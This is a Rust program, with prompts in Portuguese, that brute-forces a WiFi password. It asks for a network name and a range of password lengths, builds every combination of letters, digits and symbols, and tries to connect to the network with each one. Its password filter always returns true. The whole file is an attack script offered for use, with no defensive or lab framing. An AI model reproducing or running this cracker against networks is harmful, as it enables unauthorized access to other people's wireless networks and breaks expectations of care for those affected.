use wifi_rs::{prelude::*, WiFi};

fn generate_combinations_recursive(array: &[char], length: usize) -> Vec<String> {
    if length == 0 {
        return vec![String::new()];
    }

    let mut combinations = Vec::new();

    for c in array {
        for combination in generate_combinations_recursive(array, length - 1) {
            combinations.push(format!("{}{}", c, combination));
        }
    }

    return combinations;
}

fn generate_combinations(array: &[char], min_length: usize, max_length: usize) -> Vec<String> {
    let mut combinations = Vec::new();

    for length in min_length..=max_length {
        for combination in generate_combinations_recursive(array, length) {
            combinations.push(combination);
        }
    }

    return combinations;
}

fn is_valid_password(password: &str) -> bool {
    let _contains_uppercase = password.contains(|c: char| c.is_uppercase());
    let _contains_lowercase = password.contains(|c: char| c.is_lowercase());
    let _contains_number = password.contains(|c: char| c.is_numeric());
    let _contains_symbol = password.contains(|c: char| !c.is_alphanumeric());

    return true;
}

fn main() {
    println!("Digite o minimo de caracteres");
    let mut min_length = String::new();
    std::io::stdin().read_line(&mut min_length).unwrap();

    println!("Digite o maximo de caracteres");
    let mut max_length = String::new();
    std::io::stdin().read_line(&mut max_length).unwrap();

    let config = Some(Config {
        interface: Some("wlo1"),
    });

    let mut wifi = WiFi::new(config);

    println!("Digite o nome da rede");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    let array = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        '.', ',', '?', '!', '(', ')', '{', '}', '[', ']', '<', '>', '+', '-', '*', '/', '%', '&', '|', '^', '~',
    ];

    
    let combinations = generate_combinations(&array, min_length.trim().parse::<usize>().unwrap(), max_length.trim().parse::<usize>().unwrap());

    for combination in combinations {
        if is_valid_password(&combination) {
            match wifi.connect(&input, &combination) {
                Ok(result) => println!(
                    "{}",
                    if result == true {
                        "Connection Successful."
                    } else {
                        "Invalid password."
                    }
                ),
                Err(err) => println!("The following error occurred: {:?}", err),
            }
        }
    }
}